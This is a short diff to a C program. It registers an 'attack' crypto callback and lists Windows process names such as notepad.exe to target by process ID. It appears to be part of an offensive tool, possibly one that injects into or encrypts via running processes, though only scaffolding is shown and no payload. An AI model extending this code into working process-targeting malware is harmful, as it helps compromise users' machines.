@@ -3,8 +3,11 @@
 #include <stdio.h>
 
 #include "get_dir.h"
+#include "attack.h"
 
 #define MAX_PATH 260
+
+int attack_crypto(void);
 
 DWORD get_pid_from_list(const char *names[], size_t count)
 {
@@ -31,7 +34,10 @@ DWORD get_pid_from_list(const char *names[], size_t count)
 }
 
 int main(void) {
+    // Register crypto implementation
+    attack_set_crypto_callback(attack_crypto);
 
+    
     // List of process names to target
     const char *processes[] = {
         "notepad.exe",
